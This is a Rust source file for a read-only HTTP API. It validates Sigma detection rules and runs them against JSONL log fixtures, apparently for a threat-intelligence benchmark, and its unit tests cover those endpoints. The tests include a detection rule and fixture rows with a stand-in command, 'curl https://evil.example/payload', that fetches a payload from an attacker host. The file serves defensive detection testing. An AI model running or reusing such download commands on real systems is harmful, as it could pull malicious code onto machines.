//! Read-only Sigma evaluation API over the pinned CTI-REALM JSONL fixtures.

use serde::Deserialize;
use serde_json::{json, Map, Value};
use sigma_engine::{SigmaCollection, SigmaDocument, SigmaRuleMatcher};
use std::collections::{BTreeMap, BTreeSet, HashMap};
use std::env;
use std::fs::{self, File};
use std::io::{BufRead, BufReader, Read, Write};
use std::net::TcpStream;
use std::path::{Path, PathBuf};
use std::sync::{mpsc, Arc, Mutex};
use std::thread;
use std::time::Duration;
use tiny_http::{Header, Method, Request, Response, Server, StatusCode};

const MAX_BODY_BYTES: u64 = 1_000_000;
const MAX_EXECUTE_LIMIT: usize = 10;
const MAX_SAMPLE_LIMIT: usize = 20;

const SOURCES: [(&str, &str); 12] = [
    (
        "AADServicePrincipalSignInLogs",
        "aadserviceprincipalsigninlogs.jsonl",
    ),
    ("AKSAudit", "aksaudit.jsonl"),
    ("AKSAuditAdmin", "aksauditadmin.jsonl"),
    ("AuditLogs", "auditlogs.jsonl"),
    ("AzureActivity", "azureactivity.jsonl"),
    ("AzureDiagnostics", "azurediagnostics.jsonl"),
    ("DeviceFileEvents", "devicefileevents.jsonl"),
    ("DeviceProcessEvents", "deviceprocessevents.jsonl"),
    (
        "MicrosoftGraphActivityLogs",
        "microsoftgraphactivitylogs.jsonl",
    ),
    ("OfficeActivity", "officeactivity.jsonl"),
    ("SignInLogs", "signinlogs.jsonl"),
    ("StorageBlobLogs", "storageboblogs.jsonl"),
];

#[derive(Debug)]
struct ApiError {
    status: u16,
    message: String,
}

impl ApiError {
    fn bad_request(message: impl Into<String>) -> Self {
        Self {
            status: 400,
            message: message.into(),
        }
    }

    fn not_found(message: impl Into<String>) -> Self {
        Self {
            status: 404,
            message: message.into(),
        }
    }

    fn unprocessable(message: impl Into<String>) -> Self {
        Self {
            status: 422,
            message: message.into(),
        }
    }

    fn internal(message: impl Into<String>) -> Self {
        Self {
            status: 500,
            message: message.into(),
        }
    }
}

#[derive(Debug, Deserialize)]
struct RuleRequest {
    sigma_rule: Value,
}

#[derive(Debug, Deserialize)]
struct ExecuteRequest {
    source: String,
    sigma_rule: Value,
    #[serde(default = "default_execute_limit")]
    limit: usize,
}

fn default_execute_limit() -> usize {
    10
}

struct CompiledRule {
    title: String,
    matcher: SigmaRuleMatcher,
}

fn rule_yaml(value: &Value) -> Result<String, String> {
    match value {
        Value::String(text) => Ok(text.clone()),
        Value::Object(_) => serde_yaml::to_string(value).map_err(|error| error.to_string()),
        _ => Err("sigma_rule must be a YAML string or object".to_string()),
    }
}

fn compile_rule(value: &Value) -> Result<CompiledRule, String> {
    let yaml = rule_yaml(value)?;
    let collection = SigmaCollection::from_yaml(&yaml).map_err(|error| error.to_string())?;
    if collection.documents.len() != 1 {
        return Err("sigma_rule must contain exactly one document".to_string());
    }
    let rule = match &collection.documents[0] {
        SigmaDocument::Rule(rule) => rule.clone(),
        _ => return Err("correlation rules are not supported".to_string()),
    };
    let title = rule.title.clone();
    let matcher = SigmaRuleMatcher::new(rule).map_err(|error| error.to_string())?;
    Ok(CompiledRule { title, matcher })
}

fn scalar_text(value: &Value) -> String {
    match value {
        Value::Null => String::new(),
        Value::Bool(value) => value.to_string(),
        Value::Number(value) => value.to_string(),
        Value::String(value) => value.clone(),
        Value::Array(_) | Value::Object(_) => serde_json::to_string(value).unwrap_or_default(),
    }
}

fn flatten_value(prefix: &str, value: &Value, event: &mut HashMap<String, String>) {
    event.insert(prefix.to_string(), scalar_text(value));
    if let Value::Object(object) = value {
        for (key, child) in object {
            flatten_value(&format!("{prefix}.{key}"), child, event);
        }
    }
}

fn event_from_object(object: &Map<String, Value>) -> HashMap<String, String> {
    let mut event = HashMap::new();
    for (key, value) in object {
        flatten_value(key, value, &mut event);
    }
    event
}

#[derive(Clone)]
struct SourceStore {
    data_dir: PathBuf,
}

impl SourceStore {
    fn new(data_dir: impl Into<PathBuf>) -> Self {
        Self {
            data_dir: data_dir.into(),
        }
    }

    fn source(&self, requested: &str) -> Result<(&'static str, PathBuf), ApiError> {
        let (canonical, filename) = SOURCES
            .iter()
            .find(|(name, _)| name.eq_ignore_ascii_case(requested))
            .ok_or_else(|| ApiError::not_found(format!("unknown source {requested:?}")))?;
        let path = self.data_dir.join(filename);
        if !path.is_file() {
            return Err(ApiError::not_found(format!(
                "source {canonical:?} is unavailable"
            )));
        }
        Ok((canonical, path))
    }

    fn records(
        path: &Path,
    ) -> Result<impl Iterator<Item = Result<Map<String, Value>, ApiError>>, ApiError> {
        let file = File::open(path).map_err(|error| ApiError::internal(error.to_string()))?;
        Ok(BufReader::new(file)
            .lines()
            .enumerate()
            .filter_map(|(index, line)| {
                let line = match line {
                    Ok(line) if line.trim().is_empty() => return None,
                    Ok(line) => line,
                    Err(error) => return Some(Err(ApiError::internal(error.to_string()))),
                };
                Some(
                    serde_json::from_str::<Map<String, Value>>(&line).map_err(|error| {
                        ApiError::internal(format!("invalid JSONL row {}: {error}", index + 1))
                    }),
                )
            }))
    }

    fn list(&self) -> Result<Value, ApiError> {
        let mut sources = Vec::new();
        for (name, filename) in SOURCES {
            let path = self.data_dir.join(filename);
            if !path.is_file() {
                continue;
            }
            let metadata =
                fs::metadata(&path).map_err(|error| ApiError::internal(error.to_string()))?;
            sources.push(json!({
                "name": name,
                "file": filename,
                "size_bytes": metadata.len(),
            }));
        }
        Ok(json!({"sources": sources}))
    }

    fn schema(&self, requested: &str) -> Result<Value, ApiError> {
        let (source, path) = self.source(requested)?;
        let mut fields: BTreeMap<String, BTreeSet<&'static str>> = BTreeMap::new();
        for row in Self::records(&path)?.take(100) {
            for (name, value) in row? {
                let kind = match value {
                    Value::Null => "null",
                    Value::Bool(_) => "bool",
                    Value::Number(ref value) if value.is_i64() || value.is_u64() => "int",
                    Value::Number(_) => "real",
                    Value::String(_) => "string",
                    Value::Array(_) | Value::Object(_) => "dynamic",
                };
                fields.entry(name).or_default().insert(kind);
            }
        }
        let fields: Vec<Value> = fields
            .into_iter()
            .map(|(name, types)| json!({"name": name, "types": types}))
            .collect();
        Ok(json!({"source": source, "field_count": fields.len(), "fields": fields}))
    }

    fn sample(&self, requested: &str, limit: usize) -> Result<Value, ApiError> {
        let (source, path) = self.source(requested)?;
        let rows: Vec<Map<String, Value>> = Self::records(&path)?
            .take(limit.clamp(1, MAX_SAMPLE_LIMIT))
            .collect::<Result<_, _>>()?;
        Ok(json!({"source": source, "row_count": rows.len(), "rows": rows}))
    }

    fn execute(&self, request: ExecuteRequest) -> Result<Value, ApiError> {
        let (source, path) = self.source(&request.source)?;
        let compiled = compile_rule(&request.sigma_rule).map_err(ApiError::unprocessable)?;
        let limit = request.limit.clamp(1, MAX_EXECUTE_LIMIT);
        let mut rows = Vec::new();
        let mut scanned_rows = 0usize;
        for row in Self::records(&path)? {
            let row = row?;
            scanned_rows += 1;
            if compiled.matcher.matches(&event_from_object(&row)) {
                rows.push(row);
                if rows.len() >= limit {
                    break;
                }
            }
        }
        Ok(json!({
            "source": source,
            "rule": {"title": compiled.title},
            "valid": true,
            "row_count": rows.len(),
            "scanned_rows": scanned_rows,
            "matched_events": rows,
        }))
    }
}

fn query_limit(url: &str, default: usize) -> Result<usize, ApiError> {
    let Some(query) = url.split_once('?').map(|(_, query)| query) else {
        return Ok(default);
    };
    for part in query.split('&') {
        if let Some(value) = part.strip_prefix("limit=") {
            return value
                .parse()
                .map_err(|_| ApiError::bad_request("limit must be an integer"));
        }
    }
    Ok(default)
}

fn route_get(store: &SourceStore, url: &str) -> Result<Value, ApiError> {
    let path = url.split('?').next().unwrap_or(url);
    if path == "/health" {
        let count = SOURCES
            .iter()
            .filter(|(_, file)| store.data_dir.join(file).is_file())
            .count();
        return Ok(json!({"status": "ok", "sources": count}));
    }
    if path == "/v1/sources" {
        return store.list();
    }
    let parts: Vec<&str> = path.trim_matches('/').split('/').collect();
    match parts.as_slice() {
        ["v1", "sources", source, "schema"] => store.schema(source),
        ["v1", "sources", source, "sample"] => store.sample(source, query_limit(url, 5)?),
        _ => Err(ApiError::not_found("route not found")),
    }
}

fn parse_json<T: for<'de> Deserialize<'de>>(request: &mut Request) -> Result<T, ApiError> {
    let content_length = request
        .headers()
        .iter()
        .find(|header| header.field.equiv("Content-Length"))
        .and_then(|header| header.value.as_str().parse::<u64>().ok())
        .ok_or_else(|| ApiError::bad_request("Content-Length is required"))?;
    if content_length == 0 || content_length > MAX_BODY_BYTES {
        return Err(ApiError::bad_request("invalid request body size"));
    }
    let mut body = Vec::with_capacity(content_length as usize);
    request
        .as_reader()
        .take(MAX_BODY_BYTES + 1)
        .read_to_end(&mut body)
        .map_err(|error| ApiError::bad_request(error.to_string()))?;
    serde_json::from_slice(&body).map_err(|error| ApiError::bad_request(error.to_string()))
}

fn route_post(store: &SourceStore, request: &mut Request) -> Result<Value, ApiError> {
    match request.url().split('?').next().unwrap_or(request.url()) {
        "/v1/validate" => {
            let payload: RuleRequest = parse_json(request)?;
            match compile_rule(&payload.sigma_rule) {
                Ok(rule) => Ok(json!({"valid": true, "errors": [], "rule": {"title": rule.title}})),
                Err(error) => Ok(json!({"valid": false, "errors": [error]})),
            }
        }
        "/v1/execute" => {
            let payload: ExecuteRequest = parse_json(request)?;
            store.execute(payload)
        }
        _ => Err(ApiError::not_found("route not found")),
    }
}

fn json_response(status: u16, body: Value) -> Response<std::io::Cursor<Vec<u8>>> {
    let bytes = serde_json::to_vec(&body).expect("JSON values serialize");
    Response::from_data(bytes)
        .with_status_code(StatusCode(status))
        .with_header(Header::from_bytes("Content-Type", "application/json").unwrap())
}

fn handle(store: &SourceStore, mut request: Request) {
    let result = match request.method() {
        Method::Get => route_get(store, request.url()),
        Method::Post => route_post(store, &mut request),
        _ => Err(ApiError {
            status: 405,
            message: "method not allowed".to_string(),
        }),
    };
    let response = match result {
        Ok(value) => json_response(200, value),
        Err(error) => json_response(error.status, json!({"error": error.message})),
    };
    if let Err(error) = request.respond(response) {
        eprintln!("response failed: {error}");
    }
}

fn healthcheck() -> bool {
    let Ok(mut stream) = TcpStream::connect_timeout(
        &"127.0.0.1:8080".parse().expect("valid address"),
        Duration::from_secs(2),
    ) else {
        return false;
    };
    let _ = stream.set_read_timeout(Some(Duration::from_secs(2)));
    if stream
        .write_all(b"GET /health HTTP/1.0\r\nHost: localhost\r\n\r\n")
        .is_err()
    {
        return false;
    }
    let mut response = String::new();
    stream.read_to_string(&mut response).is_ok()
        && response.lines().next().is_some_and(|line| {
            line.starts_with("HTTP/1.0 200") || line.starts_with("HTTP/1.1 200")
        })
}

fn main() {
    if env::args().any(|argument| argument == "--healthcheck") {
        std::process::exit(if healthcheck() { 0 } else { 1 });
    }
    let data_dir = env::var("CTI_REALM_DATA_DIR").unwrap_or_else(|_| "/data".to_string());
    let port = env::var("PORT").unwrap_or_else(|_| "8080".to_string());
    let address = format!("0.0.0.0:{port}");
    let server =
        Server::http(&address).unwrap_or_else(|error| panic!("listen on {address}: {error}"));
    let store = Arc::new(SourceStore::new(data_dir));
    let (sender, receiver) = mpsc::sync_channel::<Request>(16);
    let receiver = Arc::new(Mutex::new(receiver));
    for _ in 0..8 {
        let store = Arc::clone(&store);
        let receiver = Arc::clone(&receiver);
        thread::spawn(move || loop {
            let request = match receiver.lock().expect("request queue poisoned").recv() {
                Ok(request) => request,
                Err(_) => return,
            };
            handle(&store, request);
        });
    }
    eprintln!("Sigma runner listening on {address}");
    for request in server.incoming_requests() {
        if sender.send(request).is_err() {
            break;
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::time::{SystemTime, UNIX_EPOCH};

    fn rule() -> Value {
        Value::String(
            r#"title: Curl download
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    FileName|endswith: curl
    ProcessCommandLine|contains: evil.example
  condition: selection
"#
            .to_string(),
        )
    }

    fn fixture_store() -> (SourceStore, PathBuf) {
        let unique = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let root = env::temp_dir().join(format!("sigma-runner-{unique}"));
        fs::create_dir_all(&root).unwrap();
        fs::write(
            root.join("deviceprocessevents.jsonl"),
            concat!(
                "{\"FileName\":\"/usr/bin/curl\",\"ProcessCommandLine\":\"curl https://evil.example/payload\"}\n",
                "{\"FileName\":\"/usr/bin/ls\",\"ProcessCommandLine\":\"ls -la\"}\n"
            ),
        ).unwrap();
        (SourceStore::new(&root), root)
    }

    #[test]
    fn official_engine_validates_and_matches() {
        let compiled = compile_rule(&rule()).unwrap();
        let event = serde_json::from_value::<Map<String, Value>>(json!({
            "FileName": "/usr/bin/curl",
            "ProcessCommandLine": "curl https://evil.example/payload"
        }))
        .unwrap();
        assert_eq!(compiled.title, "Curl download");
        assert!(compiled.matcher.matches(&event_from_object(&event)));
    }

    #[test]
    fn execution_is_bounded_and_source_is_case_insensitive() {
        let (store, root) = fixture_store();
        let result = store
            .execute(ExecuteRequest {
                source: "deviceprocessevents".to_string(),
                sigma_rule: rule(),
                limit: 100,
            })
            .unwrap();
        assert_eq!(result["source"], "DeviceProcessEvents");
        assert_eq!(result["row_count"], 1);
        assert_eq!(result["scanned_rows"], 2);
        fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn schema_and_sample_use_read_only_jsonl() {
        let (store, root) = fixture_store();
        let schema = store.schema("DEVICEPROCESSEVENTS").unwrap();
        assert_eq!(schema["field_count"], 2);
        let sample = store.sample("DeviceProcessEvents", 1).unwrap();
        assert_eq!(sample["row_count"], 1);
        fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn correlation_and_multiple_documents_are_rejected() {
        let two_rules = Value::String(format!(
            "{}\n---\n{}",
            rule().as_str().unwrap(),
            rule().as_str().unwrap()
        ));
        assert!(compile_rule(&two_rules)
            .err()
            .expect("multiple documents must fail")
            .contains("exactly one"));
    }
}
